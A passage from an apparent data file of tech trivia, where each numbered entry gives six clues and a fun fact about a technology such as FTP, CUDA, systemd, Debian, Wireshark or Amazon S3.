      'Its replication works even between servers that are often offline.',
      "Its slogan was simply 'Relax'.",
      'The document database whose name suggests a sofa.'
    ],
    funFact: 'Its name is said to stand for Cluster Of Unreliable Commodity Hardware.'
  },
  292: {
    clues: [
      'Abhay Bhushan first described it in RFC 114, in 1971.',
      'That makes it older than TCP/IP itself.',
      'It uses one connection for commands and a separate one for data.',
      "'Active' and 'passive' modes exist because of firewalls.",
      'Chrome and Firefox both removed support for it in 2021.',
      'The File Transfer Protocol.'
    ],
    funFact: "Many servers allowed 'anonymous' logins, where you typed your email address as the password."
  },
  293: {
    clues: [
      'Former Google engineers founded its company in 2015.',
      "It was inspired by Google's globally distributed database, Spanner.",
      'It speaks the Postgres wire protocol.',
      'It spreads data across nodes and regions and survives losing some of them.',
      'Its name suggests it is as hard to kill as a certain insect.',
      'The distributed SQL database named after a famously hardy insect.'
    ],
    funFact: 'Two of its founders, Spencer Kimball and Peter Mattis, created the image editor GIMP as students at Berkeley.'
  },
  294: {
    clues: [
      'Ryan Carniato created it, reaching version 1.0 in 2021.',
      'It uses JSX but has no virtual DOM.',
      'Its components run only once; fine-grained signals update the DOM directly.',
      'State is created with createSignal, which returns a getter and a setter.',
      'Its approach to signals influenced Angular, Preact and a proposal for JavaScript itself.',
      'The reactive UI library whose name means firm, not liquid.'
    ],
    funFact: 'Its creator spent years benchmarking UI frameworks, and his framework regularly sits near the top of the JS Framework Benchmark.'
  },
  295: {
    clues: [
      'NVIDIA released it in 2007.',
      'It lets you write general-purpose programs for graphics cards in C++.',
      'Kernels are launched with a special <<<blocks, threads>>> syntax.',
      'AlexNet, which kicked off the deep learning boom in 2012, was trained with it on two gaming GPUs.',
      "Its software ecosystem is often called NVIDIA's biggest moat.",
      "NVIDIA's parallel computing platform, short for Compute Unified Device Architecture."
    ],
    funFact: 'AlexNet was trained on two NVIDIA GTX 580 graphics cards, and its win in 2012 made GPUs the standard hardware for AI.'
  },
  296: {
    clues: [
      'Olivier Pomel and Alexis Lê-Quôc founded it in New York in 2010.',
      'Its founders wanted to bring developers and operations teams together on one dashboard.',
      'An agent on each host sends it metrics, traces and logs.',
      'Its bills are a popular topic of complaint among engineers.',
      'It is one of the biggest monitoring and observability SaaS companies.',
      'The monitoring service with a purple dog as its logo.'
    ],
    funFact: 'Its purple dog mascot is called Bits.'
  },
  297: {
    clues: [
      'Its first version, in 1985, could not even overlap its own panes.',
      'Its 1995 launch used a Rolling Stones song about starting up.',
      'Its modern versions are built on the NT kernel.',
      'Its settings have long lived in a database called the registry.',
      'When it crashes badly, you see a blue screen.',
      "Microsoft's operating system, named after the rectangles on your screen."
    ],
    funFact: "Microsoft reportedly paid millions to use 'Start Me Up' by the Rolling Stones in its 1995 launch campaign, to promote the new Start button."
  },
  298: {
    clues: [
      'Google made it available in 2010, based on its internal system Dremel.',
      'It is serverless: there are no machines to manage.',
      'You pay by the amount of data your queries scan.',
      'It hosts public datasets, from GitHub activity to weather records.',
      'Analysts query terabytes in seconds with plain SQL.',
      "Google Cloud's data warehouse, whose name promises large questions."
    ],
    funFact: 'A careless SELECT * on a huge table can cost real money, because you pay for every byte it scans.'
  },
  299: {
    clues: [
      'Tom Preston-Werner, Chris Wanstrath and PJ Hyett launched it in 2008.',
      'Its mascot is a creature that is half cat, half octopus.',
      'It made the pull request the standard way to contribute to open source.',
      'Microsoft bought it in 2018 for 7.5 billion dollars.',
      'Its green contribution graph shows how active you have been all year.',
      'The largest code hosting platform, with the Octocat as its logo.'
    ],
    funFact: 'In 2020 it stored a snapshot of public repositories on archival film in a decommissioned mine in Svalbard, meant to last 1,000 years.'
  },
  300: {
    clues: [
      'Sebastián Ramírez released it in 2018.',
      'It uses Python type hints to validate requests with Pydantic.',
      'It is built on top of Starlette and supports async out of the box.',
      'It generates interactive OpenAPI docs at /docs for free.',
      'It quickly became one of the most popular ways to build APIs in Python.',
      'The Python API framework whose name promises speed.'
    ],
    funFact: 'In 2020 its creator joked about a job ad asking for four or more years of experience with it, when it was only about a year and a half old.'
  },
  301: {
    clues: [
      'Google announced it at its I/O conference in 2013.',
      "It is built on the open-source edition of JetBrains' Java IDE.",
      'It replaced a set of Eclipse plugins as the official way to build for its platform.',
      'Since 2020 its versions have been named after animals in alphabetical order, starting with Arctic Fox.',
      'It comes with an emulator, a layout editor and Gradle builds.',
      "Google's official IDE for building Android apps."
    ],
    funFact: 'Its release names run through the alphabet: Arctic Fox, Bumblebee, Chipmunk, Dolphin, Electric Eel, Flamingo, Giraffe, Hedgehog and so on.'
  },
  302: {
    clues: [
      'Microsoft launched its first version in 2002.',
      'Its code compiles to an intermediate language run by the Common Language Runtime.',
      "A cross-platform, open-source rewrite with 'Core' in its name arrived in 2016.",
      'When the two versions merged in 2020, the version number 4 was skipped.',
      'C#, F# and Visual Basic all run on it, and its packages come from NuGet.',
      "Microsoft's developer platform, whose name starts with a dot."
    ],
    funFact: 'The unified release in 2020 was called version 5, skipping 4 to avoid confusion with the old Framework 4.x.'
  },
  303: {
    clues: [
      'Andrey Sitnik created it in 2013.',
      'It parses stylesheets into a tree and lets plugins transform it.',
      'Its best-known plugin adds vendor prefixes automatically.',
      'Tailwind CSS version 3 was usually installed as one of its plugins.',
      'It is less a preprocessor than a platform for tools that transform styles.',
      'The CSS tool whose name suggests coming after CSS.'
    ],
    funFact: 'Its creator also wrote Autoprefixer, and Nano ID, a tiny ID generator.'
  },
  304: {
    clues: [
      'It was first defined in 1993 as the successor to BOOTP.',
      'Its four-step exchange is nicknamed DORA: Discover, Offer, Request, Acknowledge.',
      'Addresses are handed out as leases that expire.',
      'It uses UDP ports 67 and 68.',
      'Your home router uses it to give every device an IP address.',
      'The Dynamic Host Configuration Protocol.'
    ],
    funFact: 'A new device that does not even have an IP address yet starts the conversation by broadcasting to the whole network.'
  },
  305: {
    clues: [
      'Martin Fowler coined the term in a 2004 article about inversion-of-control containers.',
      "James Shore called it 'a 25-dollar term for a 5-cent concept'.",
      'A class receives what it needs instead of creating it itself.',
      'It makes swapping a real service for a test double easy.',
      'Spring, Angular and ASP.NET Core have containers for it built in.',
      "Passing an object's collaborators to it from outside."
    ],
    funFact: 'The simplest form needs no framework at all: just pass what a class needs into its constructor.'
  },
  306: {
    clues: [
      'Lennart Poettering and Kay Sievers started it at Red Hat in 2010.',
      'It replaced the old System V init scripts on most Linux distributions.',
      'Services are described in unit files, and it runs as PID 1.',
      'You control it with systemctl and read its logs with journalctl.',
      'Few pieces of Linux have caused as many heated debates.',
      "The Linux init system and service manager whose name ends in a lowercase 'd'."
    ],
    funFact: "Its name is officially written in lowercase, and it also nods to 'Système D', French for getting by with whatever you have."
  },
  307: {
    clues: [
      'Ian Murdock announced it in August 1993.',
      'Its name combines the names of its founder and his girlfriend at the time, Debra.',
      'Its releases are named after Toy Story characters, like Bookworm and Trixie.',
      'Its unstable branch is always called Sid, after the boy who breaks toys.',
      'Its packages end in .deb and are managed with apt.',
      'The community Linux distribution that Ubuntu is based on.'
    ],
    funFact: 'The unstable branch is permanently named Sid, after the kid next door in Toy Story who destroys toys.'
  },
  308: {
    clues: [
      'Google released its 1.0 in 2021.',
      'UI is built from Kotlin functions marked with an annotation.',
      "When state changes, the affected functions run again: 'recomposition'.",
      'It replaces XML layout files on Android.',
      'Its multiplatform version from JetBrains also runs on iOS and desktop.',
      "Android's modern declarative UI toolkit, whose first word is a flying backpack."
    ],
    funFact: 'Its cross-platform sibling from JetBrains lets the same UI code run on Android, iOS, desktop and the web.'
  },
  309: {
    clues: [
      'Facebook released it in 2016, together with Exponent, Google and Tilde.',
      'It introduced a lockfile before its rival had one.',
      "Its second major version, nicknamed Berry, introduced Plug'n'Play without node_modules.",
      'Running it with no arguments installs all dependencies.',
      'For years it was the faster alternative to npm.',
      'The JavaScript package manager named after thread for knitting.'
    ],
    funFact: 'Its lockfile idea was such a success that npm added package-lock.json in version 5, a year later.'
  },
  310: {
    clues: [
      'The Swedish company behind it was founded in 2007.',
      'It stores nodes and relationships instead of tables.',
      'Its query language, Cypher, draws patterns in ASCII art: (a)-[:KNOWS]->(b).',
      'Journalists used it to untangle the Panama Papers.',
      'It is the best-known graph database.',
      'The graph database with a number and a single letter in its name.'
    ],
    funFact: 'The International Consortium of Investigative Journalists used it to map the connections in the 11.5 million leaked Panama Papers documents.'
  },
  311: {
    clues: [
      'Former Google engineers started it at SoundCloud in 2012.',
      "It was inspired by Google's internal monitoring system, Borgmon.",
      'It pulls metrics from HTTP endpoints instead of waiting for them to be pushed.',
      'Its query language is called PromQL.',
      'It was the second project to graduate from the Cloud Native Computing Foundation, after Kubernetes.',
      'The monitoring system named after the Titan who stole fire from the gods.'
    ],
    funFact: 'It graduated from the CNCF in 2018, making it the second project ever to do so, right after Kubernetes.'
  },
  312: {
    clues: [
      'It came out of Microsoft Research in Cambridge, England, in 2005.',
      'It belongs to the ML family and is closely related to OCaml.',
      'It can check units of measure, so adding metres to seconds is a compile error.',
      'Its pipe operator |> passes a value into the next function.',
      'It is the functional-first language of .NET, designed by Don Syme.',
      'The .NET language named after a musical note, a sibling of C#.'
    ],
    funFact: 'Don Syme also helped design generics for .NET 2.0, so C# programmers use his work every day.'
  },
  313: {
    clues: [
      'Rich Harris released it in 2015.',
      'It was built around ES modules from the start.',
      "It popularised the term 'tree-shaking' for removing unused code.",
      'It became the favourite bundler for libraries rather than apps.',
      'Vite has used it for production builds.',
      'The JavaScript bundler whose name also describes a rolled-up snack.'
    ],
    funFact: 'Its creator later built Svelte, and a Rust-based successor called Rolldown is now being developed for Vite.'
  },
  314: {
    clues: [
      'Nick Downie released it in 2013.',
      'It draws on an HTML canvas rather than with SVG.',
      'You pass it a type, a data object and an options object.',
      'Bar, line, pie, doughnut and radar are built-in types.',
      'It is one of the simplest ways to add a chart to a web page.',
      'The popular JavaScript charting library whose name says exactly what it does.'
    ],
    funFact: 'Because it draws on canvas, a chart is just pixels, which keeps it fast with many points but harder to style with CSS.'
  },
  315: {
    clues: [
      'A company called Deis announced it in 2015.',
      'Its packages are called charts.',
      "You override a chart's defaults in values.yaml.",
      'Its third version removed the server-side component called Tiller.',
      'It calls itself the package manager for Kubernetes.',
      "The Kubernetes tool named after a ship's steering wheel."
    ],
    funFact: "It follows Kubernetes' nautical theme: Kubernetes is Greek for helmsman, and this tool is the wheel."
  },
  316: {
    clues: [
      'It was unveiled at a conference in Aarhus, Denmark, in 2011.',
      'Its creators hoped browsers would one day run it natively instead of JavaScript.',
      'A special build of Chromium, called after it, shipped with its virtual machine.',
      'Its packages are published on pub.dev.',
      'Flutter apps are written in it.',
      "Google's client-side language, named after a small arrow you throw at a board."
    ],
    funFact: 'Google dropped the plan to put its virtual machine in Chrome in 2015 and focused on compiling it to JavaScript and native code instead.'
  },
  317: {
    clues: [
      'It was developed at Yahoo around 2007.',
      'It stores small pieces of coordination data in a tree of nodes.',
      'Distributed systems use it for leader election, locks and configuration.',
      'Kafka depended on it for years, until version 4.0 finally removed it.',
      "It is named for the job of looking after Hadoop's animal-named projects.",
      'The Apache coordination service whose name is a job at the zoo.'
    ],
    funFact: 'Its name fits a Hadoop ecosystem full of animal names, such as Pig and the Hadoop elephant itself.'
  },
  318: {
    clues: [
      'It began in 2011 as the second version of a framework called SproutCore.',
      'Yehuda Katz and Tom Dale are among its creators.',
      'It is known for convention over configuration and strong stability promises.',
      'Its templates grew out of Handlebars, and it has its own CLI.',
      'Its mascot is a hamster called Tomster.',
      'The ambitious JavaScript framework named after a glowing piece of coal.'
    ],
    funFact: 'LinkedIn and Apple Music on the web have both used it.'
  },
  319: {
    clues: [
      'Doug Cutting and Mike Cafarella split it out of the Nutch search engine in 2006.',
      'It was based on two Google papers: one on a file system, one on MapReduce.',
      'Yahoo was its biggest early user and backer.',
      'Its distributed file system is called HDFS.',
      "It started the 'big data' era of the late 2000s.",
      'The big data framework named after a yellow toy elephant.'
    ],
    funFact: "Doug Cutting named it after his son's yellow toy elephant."
  },
  320: {
    clues: [
      'Its version 1.0 came out in 2022.',
      'Its back end is written in Rust.',
      'Instead of bundling a browser, it uses the webview built into the operating system.',
      'Its apps can be just a few megabytes, where rivals ship over a hundred.',
      'Version 2, from 2024, added iOS and Android.',
      'The Rust-powered alternative to Electron for building desktop apps with web technology.'
    ],
    funFact: 'Because it does not ship Chromium, a simple app can be smaller than a single image on many websites.'
  },
  321: {
    clues: [
      'Red Hat started it around 2018.',
      'Unlike its best-known rival, it needs no background daemon.',
      'It can run containers as an ordinary user, without root.',
      'It can group containers into pods, like Kubernetes does.',
      'Many people simply alias docker to it.',
      'The daemonless container engine whose name starts with Pod.'
    ],
    funFact: "Its command-line interface is so close to Docker's that 'alias docker=podman' is a common tip in its docs."
  },
  322: {
    clues: [
      'GitHub created it in 2013 for its own code editor.',
      'It was first called Atom Shell.',
      'It bundles Chromium and Node.js into every app.',
      "VS Code, Slack and Discord's desktop apps are built on it.",
      'Critics complain that each app ships a whole browser.',
      'The framework for desktop apps with web technology, named after a subatomic particle.'
    ],
    funFact: 'The Atom editor it was built for was retired in 2022, but the framework lives on in many popular apps.'
  },
  323: {
    clues: [
      'Its creator took about two years off work, unpaid, to build it.',
      "It was released in 2007, and its author's talks about simplicity became famous.",
      'Its data structures are immutable and persistent by default.',
      'It is a dialect of Lisp that runs on the Java virtual machine.',
      'Rich Hickey designed it, and it has a sibling that compiles to JavaScript.',
      'The JVM Lisp whose name sounds like a programming term for a function that captures variables.'
    ],
    funFact: 'Rich Hickey chose the name because it contains the letters C, L and J, for C#, Lisp and Java.'
  },
  324: {
    clues: [
      'Kamil Myśliwiec released it in 2017.',
      'Its architecture of modules, decorators and dependency injection is borrowed from Angular.',
      'It runs on top of Express or, optionally, Fastify.',
      'Controllers are classes with decorators such as @Get() and @Post().',
      'It is a TypeScript-first framework for server-side Node.js apps.',
      "The TypeScript framework for Node.js whose name is a bird's home."
    ],
    funFact: 'Its logo is a red cat, even though its name suggests a bird.'
  },
  325: {
    clues: [
      'Leslie Lamport created it in the early 1980s.',
      "It is a set of macros on top of Donald Knuth's typesetting system.",
      'Documents begin with \\documentclass and use \\begin{document}.',
      'Its maths typesetting is the gold standard for scientific papers.',
      'Overleaf lets you write it together in the browser.',
      "The document preparation system whose name is pronounced 'lah-tek', not like the rubber."
    ],
    funFact: "Knuth's underlying system has version numbers that converge on pi: the current one is 3.141592653."
  },
  326: {
    clues: [
      'Chris McCord released it in 2014.',
      'It is written in Elixir and runs on the BEAM.',
      'In 2015 its team held two million WebSocket connections on a single server.',
      'Its LiveView feature builds interactive pages without writing JavaScript.',
      'It is the most popular web framework for Elixir.',
      'The Elixir framework named after a mythical bird that rises from its ashes.'
    ],
    funFact: 'Its two-million-connections benchmark was run on a single server with 40 cores and 128 GB of RAM.'
  },
  327: {
    clues: [
      'Colin McDonnell released it in 2020.',
      'You describe the shape of your data once, and get both validation and a static type.',
      'z.infer turns a schema into a TypeScript type.',
      'Calls such as z.object({ name: z.string() }) define a schema.',
      'It is a favourite for validating forms, environment variables and API input.',
      'The TypeScript-first schema library with a three-letter name starting with Z.'
    ],
    funFact: 'Its fourth major version, released in 2025, made it much faster and smaller.'
  },
  328: {
    clues: [
      'Trygve Reenskaug described it at Xerox PARC in 1979.',
      "Its first version had a fourth part called 'Editor'.",
      'It separates data, what the user sees, and the logic that handles input.',
      'Ruby on Rails and ASP.NET made it the default way to build web apps.',
      'Django calls its variant MTV.',
      'Model-View-Controller.'
    ],
    funFact: "Reenskaug's first name for it was Thing-Model-View-Editor."
  },
  329: {
    clues: [
      'It was announced as a technical preview in June 2021.',
      "Its first version was powered by OpenAI's Codex model.",
      "It suggests code as grey 'ghost text' that you accept with Tab.",
      'It became generally available in 2022 and later gained chat and agent modes.',
      'It was one of the first AI coding assistants used by millions of developers.',
      'The AI pair programmer from GitHub.'
    ],
    funFact: "Its name casts the AI as a copilot, with the developer still in the pilot's seat."
  },
  330: {
    clues: [
      'Alex Johansson, known online as KATT, became its lead developer around 2021.',
      'It gives end-to-end type safety without schemas or code generation.',
      'The server defines routers and procedures, and the client just imports their types.',
      'It became part of the popular T3 stack.',
      'It works best when front end and back end are both TypeScript.',
      'The TypeScript remote procedure call library whose name starts with a lowercase t.'
    ],
    funFact: 'Rename a field on the server, and the TypeScript compiler immediately shows every broken call in the client.'
  },
  331: {
    clues: [
      'John Mauchly described it in 1946.',
      'It only works on data that is already sorted.',
      'Each step throws away half of what is left, so it takes O(log n) steps.',
      'git bisect uses the same idea to find the commit that broke something.',
      'It is how you look up a word in a paper dictionary.',
      'The search algorithm that repeatedly halves a sorted list.'
    ],
    funFact: "A bug in Java's own implementation, computing the middle as (low + high) / 2, went unnoticed for about nine years until 2006."
  },
  332: {
    clues: [
      'It descends from NeXTSTEP, which came to Apple with Steve Jobs in 1997.',
      'Its first versions were named after big cats, from Cheetah to Mountain Lion.',
      'Since 2013 its versions have been named after places in California.',
      'It is a certified UNIX, built on the Darwin kernel.',
      'It dropped the X from its name in 2016.',
      "Apple's desktop operating system."
    ],
    funFact: 'Version 10 lasted so long, from 2001 to 2020, that Apple used nothing but 10.x for almost twenty years before Big Sur became 11.'
  },
  333: {
    clues: [
      'Andrew Kelley started it in 2016.',
      'It has no hidden control flow, no hidden allocations and no preprocessor.',
      'Code marked comptime runs at compile time instead of using macros.',
      'Its toolchain doubles as a drop-in C compiler that cross-compiles easily.',
      'The JavaScript runtime Bun is written in it.',
      'The systems language with a three-letter name that sounds like zigzag.'
    ],
    funFact: "Many projects that never write a line of it use its 'zig cc' command just to cross-compile C code."
  },
  334: {
    clues: [
      'Two Norwegian developers at Trolltech released it in 1995.',
      'Its objects talk to each other with signals and slots.',
      'A preprocessor called moc generates extra C++ code for it.',
      'The KDE desktop is built on it, and QML describes its modern UIs.',
      'It is a cross-platform C++ framework for graphical apps.',
      "The GUI toolkit whose two-letter name is officially pronounced 'cute'."
    ],
    funFact: "The Q was chosen because its creators liked how the letter looked in their editor's font, and the t stands for toolkit."
  },
  335: {
    clues: [
      'Mitchell Hashimoto released it in 2010.',
      'It became the first product of the company HashiCorp.',
      'Its configuration file is written in Ruby.',
      "One command, followed by 'up', starts a fully configured virtual machine, often on VirtualBox.",
      'Before containers took over, it was the standard way to share a development environment.',
      'The VM tool whose name means a homeless wanderer.'
    ],
    funFact: 'Its creator later built Ghostty, a popular terminal emulator.'
  },
  336: {
    clues: [
      'Guillermo Rauch founded it in 2015 under the name ZEIT.',
      'It renamed itself in 2020.',
      'Every pull request gets its own preview deployment with a unique URL.',
      'Its AI tool v0 generates user interfaces from a prompt.',
      'It is the company behind Next.js.',
      'The front-end cloud with a black triangle as its logo.'
    ],
    funFact: 'Its founder also created Socket.IO, one of the first popular libraries for real-time web apps.'
  },
  337: {
    clues: [
      "The idea goes back to Apollo Computer's network computing system in the 1980s.",
      'It is a 128-bit number.',
      'It is written as 32 hex digits in groups of 8-4-4-4-12.',
      'Version 4 is random, and version 7, standardised in 2024, starts with a timestamp.',
      'Microsoft calls it a GUID.',
      'The Universally Unique Identifier.'
    ],
    funFact: 'You would need to generate about a billion random version-4 ones every second for around 85 years to have a 50% chance of a single duplicate.'
  },
  338: {
    clues: [
      'A physicist at CERN described it in a 1991 document listing its first tags.',
      'It was based on SGML, a much older way to mark up documents.',
      "Since the 2000s it has been a 'living standard' maintained by the WHATWG.",
      'Elements such as <blink> and <marquee> were once part of it.',
      'Every web page starts with it, from <!DOCTYPE> to </body>.',
      'The HyperText Markup Language.'
    ],
    funFact: 'The first website ever, at info.cern.ch, was restored by CERN in 2013 and can still be visited.'
  },
  339: {
    clues: [
      'Donald Michie, who had worked as a codebreaker at Bletchley Park, coined the term in 1968.',
      "Its name comes from 'memo', and it is missing an 'r' on purpose.",
      'It stores the results of function calls, keyed by their arguments.',
      'It turns the naive recursive Fibonacci from exponential into linear time.',
      "React's useMemo is named after it.",
      "Caching a function's results so it never computes the same input twice."
    ],
    funFact: "It is not a typo of 'memorisation': the word comes from 'memo', a note to remember something by."
  },
  340: {
    clues: [
      "It grew out of the code in Rod Johnson's 2002 book on J2EE design.",
      'It was a lighter alternative to Enterprise JavaBeans.',
      'Its core is an inversion-of-control container for dependency injection.',
      'Annotations such as @Autowired and @RestController are everywhere in it.',
      'Its Boot project makes a runnable Java web service in minutes.',
      'The Java framework named after the season that follows winter.'
    ],
    funFact: "The name is said to mark a fresh start after the 'winter' of traditional J2EE development."
  },
  341: {
    clues: [
      'Allen Newell, Cliff Shaw and Herbert Simon used it in the 1950s for their language IPL.',
      'Each element points to the next one.',
      'Inserting at the front takes constant time, but finding the 100th element means walking there.',
      'A doubly-linked version also points back to the previous element.',
      "'Reverse it' is a classic job interview question.",
      'The data structure made of nodes that each point to the next.'
    ],
    funFact: 'Newell and Simon went on to win the Turing Award, and Simon also won a Nobel Prize in economics.'
  },
  342: {
    clues: [
      'Dylan Field and Evan Wallace founded the company in 2012.',
      'It runs in the browser, drawing its canvas with WebGL and C++ compiled to WebAssembly.',
      'Several people can edit the same file at the same time.',
      'Adobe agreed to buy it for 20 billion dollars in 2022, but the deal was called off.',
      'Designers hand off to developers with its Dev Mode.',
      'The collaborative interface design tool that replaced Sketch for many teams.'
    ],
    funFact: 'When the Adobe deal collapsed in 2023 over regulatory concerns, Adobe paid it a breakup fee of 1 billion dollars.'
  },
  343: {
    clues: [
      'Larry Ellison, Bob Miner and Ed Oates started the company behind it in 1977.',
      'Its name came from a CIA project they had worked on.',
      'Its first release was called version 2; there never was a version 1.',
      'Its procedural language is PL/SQL.',
      'Big enterprises run it, and its licensing is famously expensive.',
      "Larry Ellison's flagship relational database, named after a prophet of the gods."
    ],
    funFact: 'It skipped version 1 because the founders thought customers would not trust a first version.'
  },
  344: {
    clues: [
      'Tony Tam started it in 2011 at a company called Wordnik.',
      'In 2015 it was donated to a Linux Foundation initiative and renamed.',
      'It describes every path, parameter and response of an HTTP API in YAML or JSON.',
      'Tools generate interactive docs, clients and servers from it.',
      'It is still widely known by its old name, Swagger.',
      "The standard for describing REST APIs, whose name starts with 'Open'."
    ],
    funFact: 'The Swagger name lives on as a brand of tools by SmartBear, while the specification itself was renamed.'
  },
  345: {
    clues: [
      'Max Lynch, Ben Sperry and Adam Bradley released it in 2013.',
      'It first combined AngularJS with Apache Cordova.',
      'Its team built the compiler Stencil to make its components framework-agnostic.',
      'Its native runtime Capacitor replaced Cordova.',
      'It builds mobile apps from web technology.',
      'The hybrid app framework whose name sounds like a type of chemical bond.'
    ],
    funFact: 'Its components are standard web components, so they work with Angular, React, Vue or no framework at all.'
  },
  346: {
    clues: [
      'Brian Mann started building it in 2014, and it went public around 2017.',
      'Unlike older tools, it runs inside the same browser loop as your app.',
      "Its runner lets you 'time travel' through DOM snapshots of every step.",
      "Tests chain commands like cy.get('button').click().",
      'For years it was the most popular end-to-end testing tool for front-end developers.',
      'The testing tool named after an evergreen tree.'
    ],
    funFact: 'Its early versions only supported Chrome-based browsers; Firefox support came in 2020.'
  },
  347: {
    clues: [
      'Taylor Otwell released it in 2011.',
      'Its name was loosely inspired by a castle in the Narnia books.',
      'Its ORM is called Eloquent and its templates are Blade.',
      'Its command-line tool is called Artisan.',
      'It is the most popular PHP framework.',
      'The PHP framework by Taylor Otwell, known for its elegant syntax.'
    ],
    funFact: 'Otwell has said the name echoes Cair Paravel, the castle of the kings and queens of Narnia.'
  },
  348: {
    clues: [
      'Yehuda Katz and Carl Lerche wrote its first version in 2014.',
      'It downloads dependencies from crates.io.',
      'Its manifest lists dependencies under a [dependencies] table.',
      'Commands such as build, run, test and clippy all go through it.',
      'It is the package manager and build tool for Rust.',
      "Rust's package manager, named after goods carried by a ship."
    ],
    funFact: 'Yehuda Katz had earlier co-created Bundler for Ruby, and the design shows the influence.'
  },
  349: {
    clues: [
      'Mark Otto and Jacob Thornton built it inside a social network in 2011.',
      'Its internal name at first was Twitter Blueprint.',
      'It made a 12-column grid the default for a generation of websites.',
      'Classes such as .btn, .container and .navbar come from it.',
      'Countless sites from the 2010s share its recognisable look.',
      'The CSS framework whose name also means starting a system from scratch.'
    ],
    funFact: 'For a while it was the most-starred project on GitHub.'
  },
  350: {
    clues: [
      'The W3C published it as a recommendation in 1998.',
      'It is a simplified subset of SGML.',
      'Every opening tag must be closed, and documents must be well-formed.',
      'XPath, XSLT and XSD schemas all work with it.',
      'It is the X in AJAX, and SOAP messages are written in it.',
      'The eXtensible Markup Language.'
    ],
    funFact: 'Word and Excel files ending in .docx and .xlsx are zip archives full of it.'
  },
  351: {
    clues: [
      'Ton Roosendaal started it in the Netherlands in the mid-1990s as an in-house tool.',
      'After his company went bankrupt, a 2002 campaign raised 100,000 euros to buy its source code.',
      'Its foundation and studio are based in Amsterdam.',
      'It makes open movies, such as Big Buck Bunny and Sintel.',
      'It is a free, open-source suite for 3D modelling, animation and rendering.',
      'The 3D software that shares its name with a kitchen appliance.'
    ],
    funFact: "The 'Free Blender' campaign in 2002 raised 100,000 euros in just seven weeks, and the software has been open source ever since."
  },
  352: {
    clues: [
      'Jesse James Garrett coined the term in a February 2005 essay.',
      'The browser object behind it was first built by Microsoft for Outlook on the web.',
      'Gmail and Google Maps showed the world what it could do.',
      'It lets a page fetch data in the background without a full reload.',
      'Its name stands for Asynchronous JavaScript and XML.',
      'The web technique that shares its name with an Amsterdam football club.'
    ],
    funFact: 'XMLHttpRequest, the object at its heart, was created by the Outlook Web Access team and shipped in Internet Explorer 5 in 1999.'
  },
  353: {
    clues: [
      'Willy Tarreau started it around 2000.',
      'It balances both TCP and HTTP traffic.',
      'GitHub, Reddit and Stack Overflow have all used it in front of their servers.',
      'Its configuration has frontend and backend sections.',
      'It is famous for handling huge numbers of connections with little CPU.',
      'The High Availability Proxy.'
    ],
    funFact: 'Its author also maintained long-term stable branches of the Linux kernel for years.'
  },
  354: {
    clues: [
      'Apple created it in 2001 by forking KHTML from the KDE project.',
      'It powered Safari from its first release in 2003.',
      'Chrome also used it until Google forked it into Blink in 2013.',
      'For years, every browser on the iPhone was required to use it.',
      'It is the engine behind Safari today.',
      "Apple's browser engine, whose name joins the web and a set of tools."
    ],
    funFact: 'Chrome DevTools grew out of its Web Inspector, from before Google forked the engine.'
  },
  355: {
    clues: [
      'It was in use for decades before RFC 4180 tried to describe it in 2005.',
      'A value containing the separator has to be wrapped in double quotes.',
      'Some locales, like Dutch Excel, use semicolons instead, which confuses everyone.',
      'Spreadsheets love to turn its values into dates when you open it.',
      'It is the simplest way to move a table between programs.',
      'The format of comma-separated values.'
    ],
    funFact: 'Spreadsheet software kept turning gene names such as SEPT2 and MARCH1 into dates, so in 2020 scientists renamed 27 human genes.'
  },
  356: {
    clues: [
      'Gerald Combs started it in 1998.',
      'It captures every packet on a network interface.',
      'Display filters such as tcp.port == 443 narrow down what you see.',
      'Its dissectors decode thousands of protocols.',
      'It was renamed in 2006 because its original name, Ethereal, was trademarked by a former employer.',
      'The network protocol analyser named after a predator in the sea.'
    ],
    funFact: 'Its creator changed jobs in 2006 and could not take the Ethereal trademark with him, so the project got a new name.'
  },
  357: {
    clues: [
      'John Ousterhout created it at Berkeley in 1988.',
      'In it, everything is a string, even code.',
      'It was meant to be embedded as a command language inside other tools.',
      "Its GUI toolkit Tk is what Python's tkinter wraps.",
      'Chip design tools and the automation tool Expect still use it.',
      "The Tool Command Language, pronounced 'tickle'."
    ],
    funFact: "Python's standard GUI library tkinter literally runs an interpreter for this language behind the scenes."
  },
  358: {
    clues: [
      'It launched in beta in August 2006.',
      'Much of it was first built by a small team in Cape Town, South Africa.',
      'You start machines from images called AMIs.',
      'Instance types have names like t3.micro and m5.large, and spot instances are sold cheaply.',
      'It made renting a server by the hour normal.',
      "Amazon's Elastic Compute Cloud."
    ],
    funFact: 'Its first version was developed in Cape Town by a team led by Chris Pinkham.'
  },
  359: {
    clues: [
      'It became common through email standards for attachments.',
      'It turns every three bytes into four printable characters.',
      'Its alphabet is A to Z, a to z, 0 to 9, plus two symbols.',
      'One or two equals signs at the end are padding.',
      'Data URIs and JWTs use it or a URL-safe variant of it.',
      'The binary-to-text encoding named after the number of characters it uses.'
    ],
    funFact: 'Because four characters carry three bytes, encoding something with it makes it about a third bigger.'
  },
  360: {
    clues: [
      'The Khronos Group released it in 2016.',
      'It grew out of Mantle, a graphics API donated by AMD.',
      'It gives developers explicit, low-level control over the GPU.',
      'Its shaders are compiled to an intermediate format called SPIR-V.',
      'It is seen as the successor to OpenGL.',
      'The cross-platform graphics API whose name is German for volcano.'
    ],
    funFact: 'On Apple devices, which do not support it natively, a translation layer called MoltenVK runs it on top of Metal.'
  },
  361: {
    clues: [
      'It started as a mathematical notation in a 1962 book by Kenneth Iverson.',
      'It needs special symbols such as ⍴ and ⍳, and it once needed a special keyboard.',
      'It works on whole arrays at once, without explicit loops.',
      "Conway's Game of Life fits in a single famous line of it.",
      'It inspired array languages such as J, K and Q.',
      'A three-letter language named after the title of the book that introduced it.'
    ],
    funFact: 'Kenneth Iverson received the Turing Award in 1979, largely for this notation.'
  },
  362: {
    clues: [
      'Eric Schoffstall created it in 2013.',
      'It favoured code over configuration, in contrast to its rival Grunt.',
      'Tasks stream files through plugins with .pipe().',
      'Its tasks live in a JavaScript file named after the tool itself.',
      'It was the go-to front-end task runner before bundlers took over.',
      'The JavaScript task runner whose name means to swallow quickly.'
    ],
    funFact: 'Its logo is a red soda cup with a straw, matching the idea of drinking something down in one go.'
  },
  363: {
    clues: [
      'It launched on 14 March 2006, Pi Day.',
      'Files are stored as objects inside buckets.',
      'It is designed for eleven nines of durability.',
      'In 2017 a typo in a single command took down part of it, and much of the web with it.',
      'Many other services now offer an API compatible with it.',
      "Amazon's Simple Storage Service."
    ],
    funFact: 'Its 2017 outage began when an engineer mistyped a command meant to remove a small number of servers.'
  },
  364: {
